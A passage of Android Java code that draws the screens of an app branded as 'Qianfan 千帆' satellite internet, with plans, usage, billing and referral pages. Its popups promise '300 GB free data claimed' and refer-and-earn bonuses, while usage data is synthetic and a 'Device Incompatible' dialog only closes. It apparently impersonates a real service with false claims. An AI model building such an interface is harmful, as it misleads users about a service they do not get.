            card(c, dp(24), h * 0.67f, w - dp(48), dp(84));
            float mid = w / 2;
            text(c, speedTestState >= 3 ? downloadStr : (speedTestState == 1 ? downloadStr : (speedTestState == 2 ? downloadStr : "0.0")), dp(48), h * 0.725f, 28, TEXT, Paint.Align.LEFT, false);
            text(c, "Mbps", dp(130), h * 0.725f, 12, MUTED, Paint.Align.LEFT, false);
            text(c, "Download", dp(48), h * 0.76f, 13, CYAN, Paint.Align.LEFT, false);
            
            text(c, speedTestState >= 3 ? uploadStr : (speedTestState == 2 ? uploadStr : "0.0"), mid + dp(24), h * 0.725f, 28, TEXT, Paint.Align.LEFT, false);
            text(c, "Mbps", mid + dp(106), h * 0.725f, 12, MUTED, Paint.Align.LEFT, false);
            text(c, "Upload", mid + dp(24), h * 0.76f, 13, CYAN, Paint.Align.LEFT, false);
            
            pill(c, dp(24), h * 0.80f, w - dp(48), dp(50), speedTestState == 0 ? "Start Test" : (speedTestState == 3 ? "Test Again" : "Testing..."), BLUE, "start_speed");
            bottom(c, w, h, 2);
        }

        private void drawPackages(Canvas c, float w, float h) {
            top(c, w, "Packages", true);
            segment(c, dp(18), dp(82), w - dp(36), "All Plans", "My Plan");
            plan(c, dp(18), dp(138), w - dp(36), "Free", "Free", "300 GB", "Just for new customers", "Your current plan");
            plan(c, dp(18), dp(228), w - dp(36), "Basic", "$1.25", "25 Mbps", "100 GB / Month", null);
            plan(c, dp(18), dp(318), w - dp(36), "Standard", "$2.50", "50 Mbps", "200 GB / Month", null);
            plan(c, dp(18), dp(408), w - dp(36), "Premium", "$5.00", "100 Mbps", "500 GB / Month", null);
            plan(c, dp(18), dp(498), w - dp(36), "Ultimate", "$20.00", "150 Mbps", "Unlimited Data", null);
            pill(c, dp(18), dp(590), w - dp(36), dp(52), "Change Plan", BLUE, "billing");
            bottom(c, w, h, 3);
        }

        private void drawUsage(Canvas c, float w, float h) {
            top(c, w, "Data Usage", true);
            card(c, dp(18), dp(82), w - dp(36), dp(112));
            text(c, "This Month", dp(34), dp(116), 12, MUTED, Paint.Align.LEFT, false);
            text(c, (int)usedData + " GB", dp(34), dp(152), 24, TEXT, Paint.Align.LEFT, true);
            text(c, "/ " + totalData + " GB", dp(130), dp(152), 12, MUTED, Paint.Align.LEFT, false);
            float progressRatio = usedData / (float)totalData;
            progress(c, dp(34), dp(172), w - dp(110), dp(9), progressRatio, GREEN);
            text(c, (int)(progressRatio * 100) + "%", w - dp(42), dp(154), 13, TEXT, Paint.Align.RIGHT, true);
            card(c, dp(18), dp(218), w - dp(36), dp(254));
            text(c, "Usage History (GB)", dp(34), dp(254), 14, TEXT, Paint.Align.LEFT, false);
            chart(c, dp(38), dp(286), w - dp(76), dp(140));
            usageLine(c, dp(34), dp(512), w - dp(68), "Today", "0 GB");
            usageLine(c, dp(34), dp(558), w - dp(68), "This Week", "0 GB");
            usageLine(c, dp(34), dp(604), w - dp(68), "Remaining", (totalData - (int)usedData) + " GB");
            bottom(c, w, h, 1);
        }

        private void drawBilling(Canvas c, float w, float h) {
            top(c, w, "Billing", true);
            segment(c, dp(18), dp(82), w - dp(36), "Overview", "History");
            card(c, dp(18), dp(146), w - dp(36), dp(130));
            text(c, "Current Plan", dp(34), dp(184), 12, MUTED, Paint.Align.LEFT, false);
            text(c, "Free 300 GB", dp(34), dp(220), 22, TEXT, Paint.Align.LEFT, true);
            text(c, "Free", dp(34), dp(252), 18, TEXT, Paint.Align.LEFT, false);
            card(c, dp(18), dp(302), w - dp(36), dp(126));
            text(c, "Current Balance", dp(34), dp(340), 12, MUTED, Paint.Align.LEFT, false);
            text(c, "$0.00", dp(34), dp(382), 30, TEXT, Paint.Align.LEFT, true);
            text(c, "You are all paid up!", dp(34), dp(414), 13, GREEN, Paint.Align.LEFT, false);
            card(c, dp(18), dp(454), w - dp(36), dp(100));
            text(c, "Payment Method", dp(34), dp(492), 12, MUTED, Paint.Align.LEFT, false);
            text(c, "Add New", dp(34), dp(530), 16, TEXT, Paint.Align.LEFT, false);
            pill(c, dp(18), h - dp(150), w - dp(36), dp(52), "Manage Billing", BLUE, "billing");
            bottom(c, w, h, 4);
        }

        private void drawSupport(Canvas c, float w, float h) {
            top(c, w, "Support", true);
            text(c, "How can we help you?", dp(24), dp(112), 20, TEXT, Paint.Align.LEFT, true);
            field(c, dp(24), dp(136), w - dp(48), dp(54), "Search help topics...");
            menu(c, dp(24), dp(226), w - dp(48), "FAQs", "Find answers to common questions", CYAN);
            menu(c, dp(24), dp(306), w - dp(48), "Contact Support", "Chat or email our support team", Color.rgb(123, 97, 255));
            menu(c, dp(24), dp(386), w - dp(48), "System Status", "Check network status", GREEN);
            menu(c, dp(24), dp(466), w - dp(48), "Report an Issue", "Let us know if something is wrong", Color.rgb(255, 145, 95));
            bottom(c, w, h, 4);
        }

        private void drawPopup(Canvas c, float w, float h) {
            p.setColor(Color.argb(150, 0, 0, 0));
            c.drawRect(0, 0, w, h, p);
            
            float pw = w - dp(60);
            float ph = dp(320);
            float px = dp(30);
            float py = (h - ph) / 2;
            
            p.setAlpha(255);
            p.setStyle(Paint.Style.FILL);
            p.setShader(new LinearGradient(px, py, px, py + ph, CARD_2, CARD, Shader.TileMode.CLAMP));
            c.drawRoundRect(new RectF(px, py, px + pw, py + ph), dp(20), dp(20), p);
            p.setShader(null);
            
            p.setStyle(Paint.Style.STROKE);
            p.setStrokeWidth(dp(1.5f));
            p.setColor(Color.argb(80, 0, 212, 255));
            c.drawRoundRect(new RectF(px, py, px + pw, py + ph), dp(20), dp(20), p);
            p.setStyle(Paint.Style.FILL);
            
            text(c, "X", px + pw - dp(20), py + dp(28), 16, MUTED, Paint.Align.CENTER, true);
            hit(px + pw - dp(40), py + dp(10), dp(40), dp(40), "close_popup");

            // Draw trophy image
            if (trophyImg != null) {
                float imgW = dp(80);
                float imgH = imgW * ((float)trophyImg.getHeight() / trophyImg.getWidth());
                RectF dest = new RectF(w/2 - imgW/2, py + dp(30), w/2 + imgW/2, py + dp(30) + imgH);
                // Add a glow behind the trophy
                p.setColor(Color.argb(30, 255, 204, 0));
                c.drawCircle(w/2, dest.centerY(), dp(50), p);
                p.setColor(Color.argb(60, 255, 204, 0));
                c.drawCircle(w/2, dest.centerY(), dp(30), p);
                
                c.drawBitmap(trophyImg, null, dest, null);
            }
            
            text(c, "Congratulations!", w / 2, py + dp(150), 20, MUTED, Paint.Align.CENTER, false);
            
            text(c, "300 GB free data claimed.", w / 2, py + dp(190), 22, TEXT, Paint.Align.CENTER, true);
            
            text(c, "data will be added to your account", w / 2, py + dp(235), 13, Color.rgb(255, 204, 0), Paint.Align.CENTER, false);
            text(c, "in the next 2 hrs", w / 2, py + dp(255), 13, Color.rgb(255, 204, 0), Paint.Align.CENTER, false);
        }

        private void drawErrorPopup(Canvas c, float w, float h) {
            p.setColor(Color.argb(150, 0, 0, 0));
            c.drawRect(0, 0, w, h, p);

            float pw = w - dp(60);
            float ph = dp(340);
            float px = dp(30);
            float py = (h - ph) / 2;

            p.setAlpha(255);
            p.setStyle(Paint.Style.FILL);
            p.setShader(new LinearGradient(px, py, px, py + ph, CARD_2, CARD, Shader.TileMode.CLAMP));
            c.drawRoundRect(new RectF(px, py, px + pw, py + ph), dp(20), dp(20), p);
            p.setShader(null);

            p.setStyle(Paint.Style.STROKE);
            p.setStrokeWidth(dp(1.5f));
            p.setColor(Color.argb(100, 255, 82, 82));
            c.drawRoundRect(new RectF(px, py, px + pw, py + ph), dp(20), dp(20), p);
            p.setStyle(Paint.Style.FILL);

            text(c, "X", px + pw - dp(20), py + dp(28), 16, MUTED, Paint.Align.CENTER, true);
            hit(px + pw - dp(40), py + dp(10), dp(40), dp(40), "close_error");

            drawSatellite(c, w / 2 - dp(80), py + dp(70), dp(0.5f), -15);
            drawSatellite(c, w / 2 + dp(80), py + dp(70), dp(0.5f), 15);

            p.setStyle(Paint.Style.STROKE);
            p.setColor(Color.argb(60, 255, 82, 82));
            p.setPathEffect(new DashPathEffect(new float[]{dp(6), dp(6)}, 0));
            c.drawArc(new RectF(w / 2 - dp(100), py + dp(20), w / 2 + dp(100), py + dp(120)), 190, 160, false, p);
            p.setPathEffect(null);

            // Glowing Warning icon
            p.setStyle(Paint.Style.FILL);
            p.setColor(Color.argb(40, 255, 82, 82));
            c.drawCircle(w / 2, py + dp(70), dp(40), p);
            
            p.setShadowLayer(dp(15), 0, 0, RED);
            p.setColor(RED);
            android.graphics.Path triangle = new android.graphics.Path();
            triangle.moveTo(w / 2, py + dp(45));
            triangle.lineTo(w / 2 + dp(20), py + dp(85));
            triangle.lineTo(w / 2 - dp(20), py + dp(85));
            triangle.close();
            p.setStyle(Paint.Style.STROKE);
            p.setStrokeWidth(dp(3));
            p.setStrokeJoin(Paint.Join.ROUND);
            c.drawPath(triangle, p);
            
            p.setStyle(Paint.Style.FILL);
            c.drawCircle(w / 2, py + dp(78), dp(2.5f), p);
            c.drawLine(w / 2, py + dp(55), w / 2, py + dp(70), p);
            p.setShadowLayer(0, 0, 0, 0);

            text(c, "Device Incompatible", w / 2, py + dp(155), 24, RED, Paint.Align.CENTER, true);
            
            text(c, "Your device model is not", w / 2, py + dp(195), 14, MUTED, Paint.Align.CENTER, false);
            text(c, "equipped for satellite internet.", w / 2, py + dp(220), 14, MUTED, Paint.Align.CENTER, false);

            p.setColor(LINE);
            c.drawLine(px + dp(20), py + dp(255), w / 2 - dp(90), py + dp(255), p);
            c.drawLine(w / 2 + dp(90), py + dp(255), px + pw - dp(20), py + dp(255), p);
            text(c, "What would you like to do?", w / 2, py + dp(260), 12, MUTED, Paint.Align.CENTER, false);

            // Improved button
            p.setStyle(Paint.Style.FILL);
            p.setColor(Color.argb(40, 255, 255, 255));
            c.drawRoundRect(new RectF(px + dp(24), py + ph - dp(65), px + pw - dp(24), py + ph - dp(20)), dp(22), dp(22), p);
            
            p.setStyle(Paint.Style.STROKE);
            p.setStrokeWidth(dp(1.5f));
            p.setColor(Color.argb(100, 255, 255, 255));
            c.drawRoundRect(new RectF(px + dp(24), py + ph - dp(65), px + pw - dp(24), py + ph - dp(20)), dp(22), dp(22), p);
            
            p.setStyle(Paint.Style.FILL);
            text(c, "Use Cellular Data", w / 2, py + ph - dp(36), 15, Color.WHITE, Paint.Align.CENTER, true);
            hit(px + dp(24), py + ph - dp(65), pw - dp(48), dp(45), "close_error");
        }

        private void rowMenu(Canvas c, float x, float y, float w, String left, String right, int rightColor) {
            card(c, x, y, w, dp(60));
            text(c, left, x + dp(20), y + dp(34), 14, TEXT, Paint.Align.LEFT, false);
            text(c, right, x + w - dp(40), y + dp(34), 14, rightColor, Paint.Align.RIGHT, true);
            drawChevron(c, x + w - dp(20), y + dp(30), dp(10), MUTED);
        }

        private void drawProfile(Canvas c, float w, float h) {
            top(c, w, "Profile", true);
            p.setColor(Color.rgb(25, 45, 73));
            c.drawCircle(w / 2, dp(142), dp(42), p);
            p.setColor(MUTED);
            c.drawCircle(w / 2, dp(128), dp(16), p);
            c.drawOval(new RectF(w / 2 - dp(28), dp(146), w / 2 + dp(28), dp(178)), p);
            text(c, "Qianfan 千帆", w / 2, dp(216), 20, TEXT, Paint.Align.CENTER, true);
            text(c, "Satellite Internet", w / 2, dp(244), 13, MUTED, Paint.Align.CENTER, false);
            
            rowMenu(c, dp(18), dp(280), w - dp(36), "Refer & Earn 100GB", "Get free data", GREEN);
            hit(dp(18), dp(280), w - dp(36), dp(60), "open_referral");
            
            rowMenu(c, dp(18), dp(350), w - dp(36), "Satellite ID", satelliteId, TEXT);
            rowMenu(c, dp(18), dp(420), w - dp(36), "Payment Methods", "Add New", CYAN);
            rowMenu(c, dp(18), dp(490), w - dp(36), "Security", "Enabled", Color.rgb(0, 150, 255));
            rowMenu(c, dp(18), dp(560), w - dp(36), "About Qianfan 千帆", "14.91.0", TEXT);
            pill(c, dp(18), dp(640), w - dp(36), dp(56), "Sign Out", RED, "login");
            bottom(c, w, h, 4);
        }

        private void drawReferral(Canvas c, float w, float h) {
            top(c, w, "Refer & Earn", true);
            
            p.setColor(Color.argb(50, 0, 212, 255));
            c.drawCircle(w / 2, dp(180), dp(70), p);
            p.setColor(Color.argb(100, 0, 212, 255));
            c.drawCircle(w / 2, dp(180), dp(50), p);
            text(c, "100GB", w / 2, dp(190), 24, Color.WHITE, Paint.Align.CENTER, true);
            
            text(c, "Share Your Code", w / 2, dp(300), 22, TEXT, Paint.Align.CENTER, true);
            text(c, "Invite friends and you both get", w / 2, dp(330), 14, MUTED, Paint.Align.CENTER, false);
            text(c, "100GB of free satellite data!", w / 2, dp(350), 14, MUTED, Paint.Align.CENTER, false);
            
            p.setColor(Color.rgb(20, 30, 50));
            c.drawRoundRect(new RectF(dp(40), dp(400), w - dp(40), dp(480)), dp(12), dp(12), p);
            text(c, myReferralCode, w / 2, dp(450), 32, CYAN, Paint.Align.CENTER, true);
            
            pill(c, dp(40), dp(510), w - dp(80), dp(56), "Copy My Code", GREEN, "copy_referral");
            pill(c, dp(40), dp(580), w - dp(80), dp(56), "Redeem a Code", BLUE, "enter_referral");
        }

        private void drawSettings(Canvas c, float w, float h) {
            top(c, w, "Settings", true);
            text(c, "General", dp(24), dp(116), 13, MUTED, Paint.Align.LEFT, false);
            setting(c, dp(18), dp(138), w - dp(36), "Auto Connect", "Connect automatically on launch", true);
            setting(c, dp(18), dp(214), w - dp(36), "Data Saver", "Reduce data usage", false);
            setting(c, dp(18), dp(290), w - dp(36), "Speed Test on Connect", "Run speed test after connecting", true);
            text(c, "Network", dp(24), dp(396), 13, MUTED, Paint.Align.LEFT, false);
            menu(c, dp(18), dp(418), w - dp(36), "Preferred Server", "Auto", CYAN);
            menu(c, dp(18), dp(496), w - dp(36), "Advanced Settings", "Region, beam, and telemetry", MUTED);
            text(c, "About", dp(24), dp(602), 13, MUTED, Paint.Align.LEFT, false);
            menu(c, dp(18), dp(624), w - dp(36), "App Version", "14.91.0", MUTED);
            bottom(c, w, h, 4);
        }

        private void top(Canvas c, float w, String title, boolean back) {
            if (back) {
                p.setStyle(Paint.Style.STROKE);
                p.setStrokeWidth(dp(2));
                p.setColor(TEXT);
                p.setStrokeCap(Paint.Cap.ROUND);
                c.drawLine(dp(26), dp(44), dp(18), dp(36), p);
                c.drawLine(dp(26), dp(28), dp(18), dp(36), p);
                p.setStyle(Paint.Style.FILL);
            }
            text(c, title, w / 2, dp(46), 17, TEXT, Paint.Align.CENTER, true);
            if (back) hit(dp(0), dp(0), dp(72), dp(76), "home");
        }

        private void bottom(Canvas c, float w, float h, int active) {
            float y = h - dp(74);
            p.setColor(Color.rgb(8, 17, 31));
            c.drawRect(0, y, w, h, p);
            String[] labels = {"Home", "Usage", "Speed", "Packages", "Profile"};
            String[] actions = {"home", "usage", "speed", "packages", "profile"};
            for (int i = 0; i < labels.length; i++) {
                float x = w * (i + 0.5f) / labels.length;
                int color = i == active ? BLUE : MUTED;
                drawNavIcon(c, i, x, y + dp(24), color);
                text(c, labels[i], x, y + dp(52), 10, color, Paint.Align.CENTER, false);
                hit(w * i / labels.length, y, w / labels.length, dp(74), actions[i]);
            }
        }

        private void drawNavIcon(Canvas c, int index, float x, float y, int color) {
            p.setColor(color);
            p.setStrokeWidth(dp(2));
            p.setStrokeCap(Paint.Cap.ROUND);
            p.setStyle(Paint.Style.STROKE);
            if (index == 0) {
                Path roof = new Path();
                roof.moveTo(x - dp(11), y);
                roof.lineTo(x, y - dp(9));
                roof.lineTo(x + dp(11), y);
                c.drawPath(roof, p);
                c.drawRect(x - dp(8), y, x + dp(8), y + dp(12), p);
            } else if (index == 1) {
                c.drawLine(x - dp(12), y + dp(12), x + dp(12), y + dp(12), p);
                c.drawLine(x - dp(12), y + dp(12), x - dp(12), y - dp(10), p);
                c.drawLine(x - dp(5), y + dp(8), x - dp(5), y, p);
                c.drawLine(x + dp(2), y + dp(8), x + dp(2), y - dp(6), p);
                c.drawLine(x + dp(9), y + dp(8), x + dp(9), y - dp(10), p);
            } else if (index == 2) {
                c.drawArc(new RectF(x - dp(13), y - dp(8), x + dp(13), y + dp(18)), 205, 130, false, p);
                c.drawLine(x, y + dp(7), x + dp(8), y - dp(3), p);
                p.setStyle(Paint.Style.FILL);
                c.drawCircle(x, y + dp(8), dp(2), p);
                p.setStyle(Paint.Style.STROKE);
            } else if (index == 3) {
                Path top = new Path();
                top.moveTo(x, y - dp(10));
                top.lineTo(x + dp(11), y - dp(4));
                top.lineTo(x, y + dp(2));
                top.lineTo(x - dp(11), y - dp(4));
                top.close();
                c.drawPath(top, p);
                c.drawLine(x - dp(11), y - dp(4), x - dp(11), y + dp(8), p);
                c.drawLine(x + dp(11), y - dp(4), x + dp(11), y + dp(8), p);
                c.drawLine(x, y + dp(2), x, y + dp(14), p);
            } else {
                c.drawCircle(x, y - dp(4), dp(6), p);
                c.drawArc(new RectF(x - dp(13), y + dp(5), x + dp(13), y + dp(25)), 205, 130, false, p);
            }
            p.setStrokeCap(Paint.Cap.BUTT);
            p.setStyle(Paint.Style.FILL);
        }

        private void quick(Canvas c, float w) {
            String[] labels = {"Connect", "Packages", "Billing", "Support"};
            String[] actions = {"connection", "packages", "billing", "support"};
            float gap = dp(10), x = dp(18), y = dp(442), bw = (w - dp(36) - gap * 3) / 4;
            for (int i = 0; i < labels.length; i++) {
                int col = i % 4;
                int row = i / 4;
                float cy = y + row * (dp(78) + gap);
                card(c, x + col * (bw + gap), cy, bw, dp(78));
                drawQuickIcon(c, i, x + col * (bw + gap) + bw / 2, cy + dp(29), col == 0 && row == 0 ? CYAN : MUTED);
                text(c, labels[i], x + col * (bw + gap) + bw / 2, cy + dp(58), 9, TEXT, Paint.Align.CENTER, false);
                hit(x + col * (bw + gap), cy, bw, dp(78), actions[i]);
            }
        }

        private void drawQuickIcon(Canvas c, int index, float x, float y, int color) {
            p.setColor(color);
            p.setStrokeWidth(dp(2));
            p.setStrokeCap(Paint.Cap.ROUND);
            p.setStyle(Paint.Style.STROKE);
            if (index == 0) {
                c.drawArc(new RectF(x - dp(14), y - dp(14), x + dp(14), y + dp(14)), 220, 100, false, p);
                c.drawArc(new RectF(x - dp(9), y - dp(7), x + dp(9), y + dp(11)), 220, 100, false, p);
                p.setStyle(Paint.Style.FILL);
                c.drawCircle(x, y + dp(8), dp(2), p);
            } else if (index == 1) {
                drawNavIcon(c, 3, x, y, color);
            } else if (index == 2) {
                c.drawRoundRect(new RectF(x - dp(13), y - dp(9), x + dp(13), y + dp(11)), dp(3), dp(3), p);
                c.drawLine(x - dp(13), y - dp(3), x + dp(13), y - dp(3), p);
                c.drawCircle(x + dp(7), y + dp(4), dp(1.5f), p);
            } else if (index == 3) {
                c.drawCircle(x, y, dp(12), p);
                c.drawArc(new RectF(x - dp(6), y - dp(6), x + dp(6), y + dp(8)), 200, 170, false, p);
            } else {
                c.drawRect(x - dp(8), y - dp(6), x + dp(8), y + dp(6), p);
                c.drawCircle(x, y, dp(2), p);
            }
            p.setStrokeCap(Paint.Cap.BUTT);
            p.setStyle(Paint.Style.FILL);
        }

        private void card(Canvas c, float x, float y, float w, float h) {
            p.setStyle(Paint.Style.FILL);
            p.setShader(new LinearGradient(x, y, x, y + h, CARD_2, CARD, Shader.TileMode.CLAMP));
            c.drawRoundRect(new RectF(x, y, x + w, y + h), dp(10), dp(10), p);
            p.setShader(null);
            p.setStyle(Paint.Style.STROKE);
            p.setStrokeWidth(dp(1));
            p.setColor(LINE);
            c.drawRoundRect(new RectF(x, y, x + w, y + h), dp(10), dp(10), p);
            p.setStyle(Paint.Style.FILL);
        }

        private void pill(Canvas c, float x, float y, float w, float h, String label, int bg, String action) {
            p.setColor(bg);
            c.drawRoundRect(new RectF(x, y, x + w, y + h), dp(12), dp(12), p);
            int textColor = Color.WHITE;
            if (bg == CYAN) textColor = BG;
            text(c, label, x + w / 2, y + h / 2 + dp(5), 15, textColor, Paint.Align.CENTER, true);
            if (action != null) hit(x, y, w, h, action);
        }

        private void drawConnectIcon(Canvas c, float x, float y, float scale) {
            p.setStyle(Paint.Style.STROKE);
            p.setStrokeWidth(dp(2.5f) * scale);
            p.setStrokeCap(Paint.Cap.ROUND);
            c.drawArc(new RectF(x - dp(16) * scale, y - dp(16) * scale, x + dp(16) * scale, y + dp(16) * scale), 180, 180, false, p);
            c.drawArc(new RectF(x - dp(8) * scale, y - dp(8) * scale, x + dp(8) * scale, y + dp(8) * scale), 180, 180, false, p);
            p.setStyle(Paint.Style.FILL);
            c.drawCircle(x, y + dp(4) * scale, dp(2) * scale, p);
        }

        private void field(Canvas c, float x, float y, float w, float h, String label) {
            card(c, x, y, w, h);
            text(c, label, x + dp(20), y + h / 2 + dp(5), 13, MUTED, Paint.Align.LEFT, false);
        }

        private void metric(Canvas c, float x, float y, float w, String label, String value, String unit) {
            card(c, x, y, w, dp(88));
            text(c, label, x + dp(18), y + dp(28), 12, MUTED, Paint.Align.LEFT, false);
            text(c, value, x + dp(18), y + dp(62), 25, TEXT, Paint.Align.LEFT, true);
            text(c, unit, x + w - dp(18), y + dp(62), 12, MUTED, Paint.Align.RIGHT, false);
        }

        private void statBox(Canvas c, float x, float y, float w, String label, String value, String unit) {
            card(c, x, y, w, dp(78));
            text(c, label, x + w / 2, y + dp(24), 11, MUTED, Paint.Align.CENTER, false);
            text(c, value, x + w / 2, y + dp(52), 22, TEXT, Paint.Align.CENTER, false);
            text(c, unit, x + w / 2, y + dp(69), 9, MUTED, Paint.Align.CENTER, false);
        }

        private void infoRow(Canvas c, float x, float y, float w, String left, String right) {
            p.setColor(Color.argb(110, 33, 53, 78));
            c.drawLine(x, y + dp(32), x + w, y + dp(32), p);
            text(c, left, x + dp(8), y + dp(20), 13, MUTED, Paint.Align.LEFT, false);
            text(c, right, x + w - dp(8), y + dp(20), 13, right.equals("Strong") ? GREEN : TEXT, Paint.Align.RIGHT, false);
        }

        private void segment(Canvas c, float x, float y, float w, String a, String b) {
            card(c, x, y, w, dp(50));
            p.setColor(Color.argb(70, 0, 212, 255));
            c.drawRect(x, y + dp(48), x + w / 2, y + dp(50), p);
            text(c, a, x + w * 0.25f, y + dp(31), 13, CYAN, Paint.Align.CENTER, false);
            text(c, b, x + w * 0.75f, y + dp(31), 13, MUTED, Paint.Align.CENTER, false);
        }

        private void plan(Canvas c, float x, float y, float w, String name, String price, String speed, String data, String badge) {
            card(c, x, y, w, dp(82));
            boolean isActive = badge != null && badge.equals("Your current plan");
            
            if (isActive) {
                p.setStyle(Paint.Style.FILL);
                p.setColor(Color.argb(45, 0, 110, 255));
                c.drawRoundRect(new RectF(x, y, x + w, y + dp(82)), dp(10), dp(10), p);
            }
            
            float priceY = y + dp(42);
            
            if (badge != null && !badge.isEmpty()) {
                boolean isHot = badge.equals("Hot");
                int color = isHot ? RED : BLUE;
                if (!isHot) {
                    p.setStyle(Paint.Style.STROKE);
                    p.setStrokeWidth(dp(2));
                    p.setColor(color);
                    c.drawRoundRect(new RectF(x, y, x + w, y + dp(82)), dp(10), dp(10), p);
                }
                p.setStyle(Paint.Style.FILL);
                p.setColor(color);
                float bw = isActive ? dp(112) : dp(40);
                c.drawRoundRect(new RectF(x + w - bw, y + dp(12), x + w - dp(10), y + dp(36)), dp(7), dp(7), p);
                text(c, badge, x + w - (bw/2 + dp(10)), y + dp(28), 10, Color.WHITE, Paint.Align.CENTER, true);
                
                if (isActive) priceY = y + dp(68);
            }
            text(c, name, x + dp(18), y + dp(28), 15, TEXT, Paint.Align.LEFT, true);
            text(c, speed, x + dp(18), y + dp(52), 12, TEXT, Paint.Align.LEFT, false);
            text(c, data, x + dp(18), y + dp(70), 10, MUTED, Paint.Align.LEFT, false);
            text(c, price, x + w - dp(18), priceY, isActive ? 16 : 18, TEXT, Paint.Align.RIGHT, true);
            if (price.startsWith("$")) {
                text(c, "/Month", x + w - dp(18), y + dp(64), 10, MUTED, Paint.Align.RIGHT, false);
            }
        }

        private void usageLine(Canvas c, float x, float y, float w, String left, String right) {
            p.setColor(Color.argb(90, 33, 53, 78));
            c.drawLine(x, y - dp(18), x + w, y - dp(18), p);
            text(c, left, x, y, 13, MUTED, Paint.Align.LEFT, false);
            text(c, right, x + w, y, 13, TEXT, Paint.Align.RIGHT, false);
        }

        private void drawChevron(Canvas c, float cx, float cy, float size, int color) {
            p.setStyle(Paint.Style.STROKE);
            p.setStrokeWidth(dp(2));
            p.setColor(color);
            p.setStrokeCap(Paint.Cap.ROUND);
            p.setStrokeJoin(Paint.Join.ROUND);
            android.graphics.Path path = new android.graphics.Path();
            path.moveTo(cx - size/4, cy - size/2);
            path.lineTo(cx + size/4, cy);
            path.lineTo(cx - size/4, cy + size/2);
            c.drawPath(path, p);
            p.setStyle(Paint.Style.FILL);
        }

        private void menu(Canvas c, float x, float y, float w, String title, String sub, int color) {
            card(c, x, y, w, dp(70));
            text(c, title, x + dp(20), y + dp(30), 14, TEXT, Paint.Align.LEFT, true);
            text(c, sub, x + dp(20), y + dp(52), 12, MUTED, Paint.Align.LEFT, false);
            drawChevron(c, x + w - dp(24), y + dp(35), dp(12), MUTED);
        }

        private void setting(Canvas c, float x, float y, float w, String title, String sub, boolean on) {
            card(c, x, y, w, dp(64));
            text(c, title, x + dp(18), y + dp(25), 13, TEXT, Paint.Align.LEFT, true);
            text(c, sub, x + dp(18), y + dp(45), 10, MUTED, Paint.Align.LEFT, false);
            p.setColor(on ? GREEN : Color.rgb(90, 107, 128));
            c.drawRoundRect(new RectF(x + w - dp(54), y + dp(20), x + w - dp(18), y + dp(40)), dp(10), dp(10), p);
            p.setColor(Color.WHITE);
            c.drawCircle(x + w - (on ? dp(28) : dp(44)), y + dp(30), dp(9), p);
        }

        private void progress(Canvas c, float x, float y, float w, float h, float pct, int color) {
            p.setColor(Color.rgb(28, 45, 68));
            c.drawRoundRect(new RectF(x, y, x + w, y + h), h / 2, h / 2, p);
            p.setColor(color);
            c.drawRoundRect(new RectF(x, y, x + w * pct, y + h), h / 2, h / 2, p);
        }

        private void chart(Canvas c, float x, float y, float w, float h) {
            p.setColor(Color.argb(80, 151, 165, 184));
            p.setStrokeWidth(dp(1));
            for (int i = 0; i < 5; i++) c.drawLine(x, y + h * i / 4, x + w, y + h * i / 4, p);
            if (usedData > 0) {
                for (int i = 0; i < 28; i++) {
                    float bh = h * (0.25f + (float)Math.abs(Math.sin(i * 0.77)) * 0.72f);
                    p.setColor(i % 3 == 0 ? CYAN : BLUE);
                    c.drawRoundRect(new RectF(x + i * w / 30, y + h - bh, x + i * w / 30 + dp(5), y + h), dp(2), dp(2), p);
                }
            }
        }

        private void drawEarth(Canvas c, float cx, float cy, float r) {
            p.setShader(new RadialGradient(cx, cy - r * 0.4f, r, Color.rgb(28, 113, 196), Color.rgb(4, 17, 38), Shader.TileMode.CLAMP));
            c.drawCircle(cx, cy, r, p);
            p.setShader(null);
            p.setStyle(Paint.Style.STROKE);
            p.setStrokeWidth(dp(3));
            p.setColor(Color.argb(180, 0, 212, 255));
            c.drawArc(new RectF(cx - r, cy - r, cx + r, cy + r), 205, 130, false, p);
            p.setStyle(Paint.Style.FILL);
        }

        private void drawSplashEarth(Canvas c, float w, float h) {
            c.save();
            c.rotate(-13, w * 0.5f, h * 0.55f);
            RectF earth = new RectF(-w * 0.34f, h * 0.36f, w * 1.30f, h * 0.82f);
            p.setShader(new RadialGradient(w * 0.25f, h * 0.42f, w * 0.95f, Color.rgb(54, 139, 206), Color.rgb(2, 8, 18), Shader.TileMode.CLAMP));
            c.drawOval(earth, p);
            p.setShader(null);
            p.setColor(Color.argb(72, 255, 255, 255));
            c.drawOval(new RectF(w * 0.02f, h * 0.40f, w * 0.42f, h * 0.48f), p);
            c.drawOval(new RectF(w * 0.28f, h * 0.45f, w * 0.62f, h * 0.51f), p);
            p.setStyle(Paint.Style.STROKE);
            p.setStrokeWidth(dp(5));
            p.setColor(Color.argb(225, 165, 222, 255));
            c.drawArc(earth, 198, 132, false, p);
            p.setStrokeWidth(dp(13));
            p.setColor(Color.argb(90, 0, 142, 255));
            c.drawArc(earth, 200, 128, false, p);
            p.setStyle(Paint.Style.FILL);
            c.restore();
        }

        private void drawSplashBackground(Canvas c, float w, float h) {
            if (spaceBg != null) {
                float scale = Math.max(w / spaceBg.getWidth(), h / spaceBg.getHeight());
                float bw = spaceBg.getWidth() * scale;
                float bh = spaceBg.getHeight() * scale;
                float left = (w - bw) / 2f;
                float top = (h - bh) / 2f;
                c.drawBitmap(spaceBg, null, new RectF(left, top, left + bw, top + bh), p);
            }
            p.setShader(new LinearGradient(0, h * 0.42f, 0, h, Color.TRANSPARENT, Color.rgb(2, 6, 14), Shader.TileMode.CLAMP));
            c.drawRect(0, h * 0.42f, w, h, p);
            p.setShader(null);
        }

        private void drawDishScene(Canvas c, float w, float h) {
            float baseY = h * 0.39f;
            p.setShader(new RadialGradient(w * 0.58f, h * 0.24f, w * 0.58f, Color.argb(92, 0, 102, 255), Color.TRANSPARENT, Shader.TileMode.CLAMP));
            c.drawCircle(w * 0.58f, h * 0.24f, w * 0.58f, p);
            p.setShader(null);
            p.setStyle(Paint.Style.STROKE);
            p.setStrokeWidth(dp(1));
            p.setColor(Color.argb(36, 0, 102, 255));
            c.drawCircle(w * 0.56f, h * 0.30f, dp(82), p);
            c.drawCircle(w * 0.56f, h * 0.30f, dp(112), p);
            p.setStyle(Paint.Style.FILL);
            p.setShader(new LinearGradient(0, baseY - dp(40), 0, baseY + dp(58), Color.rgb(23, 52, 92), Color.rgb(5, 11, 24), Shader.TileMode.CLAMP));
            c.drawOval(new RectF(-dp(46), baseY - dp(18), w + dp(46), baseY + dp(95)), p);
            p.setShader(null);
            c.save();
            c.translate(w * 0.47f, h * 0.30f);
            c.rotate(-24);
